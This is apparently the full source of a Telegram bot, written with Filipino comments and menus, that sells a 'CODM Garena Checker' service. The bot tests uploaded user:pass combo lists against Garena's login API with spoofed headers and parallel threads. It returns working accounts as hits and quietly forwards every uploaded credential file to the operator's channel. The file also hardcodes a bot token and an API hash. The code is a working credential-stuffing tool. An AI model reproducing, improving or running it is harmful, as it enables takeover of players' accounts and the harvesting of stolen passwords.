from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
import time
import os
import re
import asyncio
import warnings
import sys
import random
import hashlib
import json
import logging
import urllib.parse
import signal
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from threading import Lock, Thread
from Crypto.Cipher import AES
import requests
import cloudscraper
import colorama
from colorama import Fore, Style, Back
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.box import Box, DOUBLE
from rich.live import Live
from rich.progress import Progress, BarColumn, TextColumn, TimeRemainingColumn, SpinnerColumn
from rich.text import Text
from rich import box
import itertools

# ==================== SETTINGS & CONFIG ====================
warnings.filterwarnings("ignore", category=DeprecationWarning)
colorama.init(autoreset=True)
console = Console()

API_ID = 35076308        
API_HASH = "9c18b57e24167754a491e4eafcb85f40"  
BOT_TOKEN = "8837738979:AAHfpq_DJQzyD3clamvJxCdDp9x1fa00U9E"
FEEDBACK_CHAT_ID = 123456789   # <--- ID MO DITO
LOG_CHANNEL_ID = 123456789      # <--- ID MO DITO
OWNER_USERNAME = "@HUMANPERSON123"

# ⚙️ CHECKER SETTINGS
BOT_NAME = "Xcs"         
MAX_THREADS = 5          # 📉 BINAWASAN KO PARA HINDI MAG-CRASH (PWEDE TAASAN HANGGANG 10)
COOLDOWN_TIME = 147      
DAILY_LIMIT_FREE = 3     
DAILY_LIMIT_PREMIUM = 9999 

LOGIN_URL = "https://sso.garena.com/api/v1/login"

# 🔑 ✅ ENCRYPTION KEYS (GARENA BASED)
KEY = "q7Tc9vR2sP4xZ8yW" 
IV = "mK3bN7gF9dS5aH2j"   

# ==================== ANIMATIONS & DESIGN (Xcs STYLE) ====================
class LoadingAnimation:
    def __init__(self):
        self.spinner_frames = ["⣾", "⣽", "⣻", "⢿", "⡿", "⣟", "⣯", "⣷"]
        self.progress_frames = ["◢", "◣", "◤", "◥"]
        self.hacker_frames = [
            "▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓",
            "▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒",
            "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░"
        ]

    def hacker_loading(self, message="Initializing Xcs System"):
        frames = ["▓", "▒", "░", "▒", "▓"]
        colors = ["red", "green", "blue", "yellow", "magenta", "cyan"]
        for i in range(10):
            color = colors[i % len(colors)]
            frame = frames[i % len(frames)]
            console.print(f"[{color}][{frame*20}][/{color}] {message}", end="\r")
            time.sleep(0.1)
        console.print()

class PremiumDesign:
    @staticmethod
    def print_boxed(text, title="", border_color="bright_blue"):
        panel = Panel.fit(text, title=title, border_style=border_color, padding=(1, 2))
        console.print(panel)

# ==================== ENCRYPTION (GARENA METHOD) ====================
def encrypt_password(password, key, iv):
    try:
        cipher = AES.new(key.encode(), AES.MODE_CBC, iv.encode())
        pad = lambda s: s + (16 - len(s) % 16) * chr(16 - len(s) % 16)
        encrypted = cipher.encrypt(pad(password).encode())
        return hashlib.md5(encrypted).hexdigest()
    except Exception as e:
        console.print(f"[red]Encryption Error: {e}[/red]")
        return hashlib.md5(password.encode()).hexdigest()

# ==================== DATABASE & USER DATA ====================
users = {}
leaderboard_checks = []
leaderboard_hits = []

def new_user(user_id, username):
    return {
        "username": username or "NoUsername",
        "join_date": datetime.now().strftime("%Y-%m-%d"),
        "is_premium": False,
        "premium_expiry": 0,
        "daily_limit": DAILY_LIMIT_FREE,
        "daily_used": 0,
        "total_checks": 0,
        "total_hits": 0,
        "referrals": 0,
        "ref_link": f"https://t.me/{BOT_TOKEN.split(':')[0]}?start={user_id}",
        "cooldown": 0,
        "lock": Lock()
    }

# ==================== MAIN MENU ====================
def main_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(f"🎮 {BOT_NAME} CODM Garena Checker", callback_data="checker")],
        [
            InlineKeyboardButton("💎 Premium", callback_data="premium"),
            InlineKeyboardButton("👤 My Profile", callback_data="profile")
        ],
        [
            InlineKeyboardButton("🤝 Referral", callback_data="referral"),
            InlineKeyboardButton("🏆 Leaderboard", callback_data="leaderboard")
        ],
        [
            InlineKeyboardButton("📊 Statistics", callback_data="stats"),
            InlineKeyboardButton("🎁 Promo Code", callback_data="promo")
        ],
        [InlineKeyboardButton("📩 Support / Feedback", callback_data="support")],
        [
            InlineKeyboardButton("🌐 Change Language", callback_data="lang"),
            InlineKeyboardButton("❓ Help", callback_data="help")
        ]
    ])

# ==================== COMBO CLEANER ====================
def clean_combo(text_content):
    lines = text_content.strip().splitlines()
    original_count = len(lines)
    cleaned_data = []
    seen = set()
    duplicates = 0
    bad_format = 0

    for line in lines:
        line = line.strip()
        if not line: continue
        if not re.search(r"[:|]", line):
            bad_format += 1
            continue
        if line in seen:
            duplicates += 1
            continue
        seen.add(line)
        cleaned_data.append(line)

    return {
        "original": original_count,
        "cleaned": len(cleaned_data),
        "duplicates": duplicates,
        "bad_format": bad_format,
        "to_check": len(cleaned_data),
        "data": cleaned_data
    }

# ==================== ✅ TOTOONG CHECKER LOGIC (API + COOKIES) ====================
def check_account(account):
    try:
        user, pwd = re.split(r"[:|]", account, 1)

        scraper = cloudscraper.create_scraper(
            browser={'browser': 'chrome', 'platform': 'android', 'mobile': True}
        )
        scraper.timeout = 15

        init_res = scraper.get("https://sso.garena.com/login")
        cookies = init_res.cookies.get_dict()

        encrypted_pass = encrypt_password(pwd, KEY, IV)

        payload = {
            "account": user,
            "password": encrypted_pass,
            "remember_me": True,
            "request_id": cookies.get("request_id", ""),
            "lang": "en",
            "platform": "android"
        }

        headers = {
            "User-Agent": "Garena/2.1.0 (Linux; Android 14; SM-G991B Build/QP1A.190711.020)",
            "Content-Type": "application/json; charset=UTF-8",
            "Accept": "application/json, text/plain, */*",
            "Origin": "https://sso.garena.com",
            "X-Requested-With": "com.garena.game.codm"
        }

        response = scraper.post(
            LOGIN_URL,
            json=payload,
            headers=headers,
            cookies=cookies,
            timeout=20
        )

        try:
            data = response.json()
        except:
            return "error", "Invalid Response"

        if data.get("code") == 0 or data.get("status") == "success":
            if "bindings" in data and len(data["bindings"]) > 0:
                return "hit", "Bound"
            else:
                return "hit", "Clean"

        elif "password" in str(data).lower() or "invalid" in str(data).lower():
            return "invalid", ""

        elif "too many" in str(data).lower():
            return "retry", "Limit"
        else:
            return "invalid", f"Code:{data.get('code_','')}"

    except Exception as e:
        return "error", str(e)[:30]

# ==================== TELEGRAM BOT FUNCTIONS ====================
app = Client("Xcs_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

@app.on_message(filters.command("start"))
async def start(client, message):
    user_id = message.from_user.id
    username = message.from_user.username or ""

    if len(message.command) > 1:
        ref_by = message.command[1]
        if ref_by.isdigit() and int(ref_by) != user_id and int(ref_by) in users:
            with users[int(ref_by)]["lock"]:
                if users[int(ref_by)]["referrals"] < 13:
                    users[int(ref_by)]["referrals"] += 1
                    if users[int(ref_by)]["referrals"] == 13:
                        users[int(ref_by)]["is_premium"] = True
                        users[int(ref_by)]["premium_expiry"] = time.time() + 86400
                        await client.send_message(int(ref_by), "🎉 **CONGRATS!** 13 REFERRALS = 1 DAY PREMIUM!")

    if user_id not in users:
        users[user_id] = new_user(user_id, username)

    await message.reply_text(f"👋 **Welcome to {BOT_NAME} CODM Garena Checker!**\n\nPiliin sa ibaba:", reply_markup=main_menu())

# ==================== 🎮 CHECKER PROCESS ====================
@app.on_callback_query(filters.regex("^checker$"))
async def checker_menu(client, callback):
    user = users[callback.from_user.id]
    now = time.time()

    if not user["is_premium"] and (now - user["cooldown"]) < COOLDOWN_TIME:
        sec = COOLDOWN_TIME - int(now - user["cooldown"])
        await callback.answer(f"🔒 Locked! ⏳ {sec}s\n(Premium: No Cooldown)", show_alert=True)
        return

    limit = DAILY_LIMIT_PREMIUM if user["is_premium"] else DAILY_LIMIT_FREE
    if user["daily_used"] >= limit:
        await callback.answer(f"❌ Daily Limit Reached ({user['daily_used']}/{limit})", show_alert=True)
        return

    await callback.message.edit_text("📤 **SEND your .TXT file NOW**\n\nFormat: `user|pass` o `user:pass`", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))

# 📂 FILE HANDLER + ✅ AUTOMATIC SEND TO YOUR CHANNEL
@app.on_message(filters.document & filters.private)
async def process_file(client, message):
    user_id = message.from_user.id
    user = users[user_id]
    doc = message.document

    if not doc.file_name.endswith(".txt"):
        await message.reply_text("❌ Magpadala lang ng `.txt` file!")
        return

    # ✅ BAGO: IPADALA ANG KOPYA NG FILE SA CHANNEL MO AGAD
    try:
        await message.forward(chat_id=LOG_CHANNEL_ID)
        await client.send_message(
            chat_id=LOG_CHANNEL_ID,
            text=f"📥 **NEW FILE RECEIVED**\n"
                 f"👤 User: @{message.from_user.username} | `{user_id}`\n"
                 f"📄 Filename: `{doc.file_name}`\n"
                 f"📦 Size: {round(doc.file_size/1024, 2)} KB"
        )
    except Exception as e:
        print(f"[LOG CHANNEL ERROR] : {e}")

    # 📥 DOWNLOAD AT IPROSESO
    file = await message.download()
    with open(file, "r", encoding="utf-8", errors="ignore") as f:
        content = f.read()
    os.remove(file)

    clean = clean_combo(content)

    msg = f"""🧹 Combo Cleaner

📋 Lines in file: {clean['original']}
✅ Cleaned: {clean['cleaned']}
🔄 Duplicates (skipped): {clean['duplicates']}
📦 Bad format: {clean['bad_format']}
📤 To check: {clean['to_check']}
"""
    if clean['to_check'] == 0:
        await message.reply_text(msg + "\n❌ Walang maiche-check.", reply_markup=main_menu())
        return

    await message.reply_text(msg + "\n⌛ Starting check...\n⌛ Added to Queue...\nPlease wait.")

    # 🚀 MULTI-THREADING CHECKER (INAYOS KO NA ITO BOSS)
    hit = 0
    invalid = 0
    clean_acc = 0
    bound_acc = 0
    error_acc = 0
    start_time = time.time()
    total = clean['to_check']
    hits_list = []

    LoadingAnimation().hacker_loading("Xcs Engine: Connecting to API...")

    results = []
    # ✅ INAYOS NA THREADING PART
    loop = asyncio.get_event_loop()
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = [loop.run_in_executor(executor, check_account, acc) for acc in clean['data']]
        for idx, future in enumerate(futures):
            status, detail = await future

            if status == "hit":
                hit += 1
                if detail == "Clean": clean_acc +=1
                if detail == "Bound": bound_acc +=1
                hits_list.append(f"✅ HIT | {clean['data'][idx]} | {detail}")
            elif status == "invalid":
                invalid += 1
            else:
                error_acc +=1

            if (idx+1) % 5 == 0 or (idx+1) == total:
                elapsed = time.time() - start_time
                speed = round((idx+1)/elapsed,2) if elapsed>0 else 0
                percent = round((hit/total)*100,1) if total>0 else 0

                stats = f"""✅ Hit: {hit} ({percent}%)
❌ Invalid: {invalid}
⚠️ Errors: {error_acc}

🎮 {BOT_NAME} CODM: {hit}
✨ Clean: {clean_acc}
🔗 Bound: {bound_acc}

🧵 Thread: {MAX_THREADS}x
⏱️ Time: {int(elapsed//60)}m {int(elapsed%60)}s
⚡ Speed: {speed} acc/s
"""
                try: await message.edit_text(stats)
                except: pass

    # ✅ FINALIZE
    user["total_checks"] += total
    user["total_hits"] += hit
    user["daily_used"] += 1
    user["cooldown"] = time.time()

    leaderboard_checks.append( (user["total_checks"], user["username"]) )
    leaderboard_hits.append( (user["total_hits"], user["username"]) )

    # SEND HITS SA USER
    if hits_list:
        with open("HITS.txt","w",encoding="utf-8") as f:
            f.write("\n".join(hits_list))
        await message.reply_document("HITS.txt", caption=f"✅ {BOT_NAME} Check Complete — HITS ONLY", reply_markup=main_menu())
        os.remove("HITS.txt")
    else:
        await message.reply_text("ℹ️ No hits found.", reply_markup=main_menu())

# ==================== 👤 PROFILE ====================
@app.on_callback_query(filters.regex("^profile$"))
async def show_profile(client, callback):
    u = users[callback.from_user.id]
    status = "✅ PREMIUM" if u["is_premium"] else "🆓 FREE"
    expiry = datetime.fromtimestamp(u["premium_expiry"]).strftime("%Y-%m-%d %H:%M") if u["is_premium"] else "---"
    limit = "UNLIMITED" if u["is_premium"] else f"{u['daily_used']}/{DAILY_LIMIT_FREE}"

    text = f"""👤 **User Info:**
├ Username: @{u['username']}
├ User ID: `{callback.from_user.id}`
└ Join Date: {u['join_date']}


💎 **Membership:**
├ Status: {status}
├ Daily Limit: {limit}
└ Expiry: {expiry}

📊 **Statistics:**
├ Total Checks: {u['total_checks']}
├ Total Hits: {u['total_hits']}
└ Referrals: {u['referrals']}/13
"""
    await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))

# ==================== 🤝 REFERRAL ====================
@app.on_callback_query(filters.regex("^referral$"))
async def referral_prog(client, callback):
    u = users[callback.from_user.id]
    bar = "█" * u["referrals"] + "░" * (13 - u["referrals"])

    text = f"""🤝 **REFERRAL PROGRAM**

📊 **YOUR STATISTICS:**
Referrals: {u['referrals']}/13 {bar}

⏳ In Progress...

🔗 **YOUR REFERRAL LINK:**
`{u['ref_link']}`

📋 **3 STEPS:**
1️⃣ Send link to friend
2️⃣ Friend starts bot
3️⃣ You get +1 point!

💎 **13 REFERRALS = 1 DAY PREMIUM**
"""
    await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))

# ==================== 🏆 LEADERBOARD ====================
@app.on_callback_query(filters.regex("^leaderboard$"))
async def show_leaderboard(client, callback):
    top_check = sorted(leaderboard_checks, reverse=True)[:5]
    top_hit = sorted(leaderboard_hits, reverse=True)[:5]

    txt = "🏆 **LEADERBOARD**\n\n📈 **MOST CHECKS:**\n"
    for i, (val, name) in enumerate(top_check,1): txt += f"{i}. @{name} → {val}\n"
    txt += "\n🎯 **MOST HITS:**\n"
    for i, (val, name) in enumerate(top_hit,1): txt += f"{i}. @{name} → {val}\n"

    await callback.message.edit_text(txt, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))

# ==================== 📊 STATISTICS ====================
@app.on_callback_query(filters.regex("^stats$"))
async def stats_only(client, callback):
    u = users[callback.from_user.id]
    txt = f"""📊 **Statistics:**
├ Total Checks: {u['total_checks']}
├ Total Hits: {u['total_hits']}
└ Referrals: {u['referrals']}
"""
    await callback.message.edit_text(txt, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))

# ==================== 💎 PREMIUM / 🎁 PROMO / 📩 SUPPORT ====================
@app.on_callback_query(filters.regex("^premium$"))
async def premium_info(client, callback):
    txt = f"""💎 **{BOT_NAME} PREMIUM VERSION**

✅ Walang Cooldown
✅ Unlimited Checks / Araw
✅ Mas Mabilis na Checking
✅ Priority Support

👉 **Para bumili, mag-message sa:** {OWNER_USERNAME}
"""
    await callback.message.edit_text(txt, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))

@app.on_callback_query(filters.regex("^promo$"))
async def promo_avail(client, callback):
    txt = f"""🎁 **{BOT_NAME} PROMO CODE**

May mga espesyal na promo code kami paminsan-minsan.
👉 **Para mag-avail, mag-message sa:** {OWNER_USERNAME}
"""
    await callback.message.edit_text(txt, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))

@app.on_callback_query(filters.regex("^support$"))
async def support_info(client, callback):
    txt = """📩 **SUPPORT / FEEDBACK**

Para magpadala ng mensahe o reklamo, i-type:
`/feedback <iyong mensahe dito>`

Direkta itong mapupunta sa aming channel.
"""
    await callback.message.edit_text(txt, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))

@app.on_message(filters.command("feedback") & filters.private)
async def send_feedback(client, message):
    if len(message.command) < 2:
        await message.reply_text("❌ Gamitin: `/feedback <iyong mensahe>`")
        return
    text = " ".join(message.command[1:])
    await client.send_message(FEEDBACK_CHAT_ID, f"📩 **NEW FEEDBACK FROM {BOT_NAME}**\nFrom: @{message.from_user.username}\nID: `{message.from_user.id}`\n\n{text}")
    await message.reply_text("✅ **Naipadala na ang iyong mensahe! Salamat.**")

# ==================== ❓ HELP / 🌐 LANG / 🔙 BACK ====================
@app.on_callback_query(filters.regex("^help$"))
async def help_info(client, callback):
    txt = f"""❓ **{BOT_NAME} HELP GUIDE**

1️⃣ **CODM Checker** → Magpadala ng `.txt` file na may `user|pass`.
2️⃣ **Premium** → Bumili para walang limitasyon.
3️⃣ **Referral** → Mag-imbita ng kaibigan para magkaroon ng Premium.
4️⃣ **Profile** → Tingnan ang iyong data at katayuan.
"""
    await callback.message.edit_text(txt, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))

@app.on_callback_query(filters.regex("^lang$"))
async def change_lang(client, callback):
    await callback.message.edit_text("🌐 **CHANGE LANGUAGE**\n\nSa ngayon: 🇵🇭 Filipino / 🇺🇸 English lang.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))

@app.on_callback_query(filters.regex("^back$"))
async def back_to_menu(client, callback):
    await callback.message.edit_text(f"👋 **Welcome to {BOT_NAME} CODM Garena Checker!**\n\nPiliin sa ibaba:", reply_markup=main_menu())

# ==================== 🚀 RUN BOT ====================
if __name__ == "__main__":
    print(f"✅ {BOT_NAME} BOT ACTIVATED")
    LoadingAnimation().hacker_loading("Loading Modules...")
    app.run()
  
